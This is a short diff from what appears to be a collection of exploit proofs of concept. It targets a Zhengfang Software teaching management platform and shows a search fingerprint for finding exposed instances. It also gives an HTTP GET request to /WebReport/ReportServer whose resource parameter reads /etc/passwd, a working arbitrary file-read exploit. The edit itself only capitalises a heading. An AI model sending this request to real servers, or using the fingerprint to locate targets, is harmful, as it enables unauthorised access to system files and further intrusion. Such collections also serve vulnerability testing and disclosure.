@@ -5,7 +5,7 @@
 body="正方软件股份有限公司" && title="教学管理信息服务平台"
 ```
 
-## poc
+## POC
 ```
 GET /WebReport/ReportServer?op=resource&resource=/etc/passwd&i18n=true HTTP/1.1
 Host: 
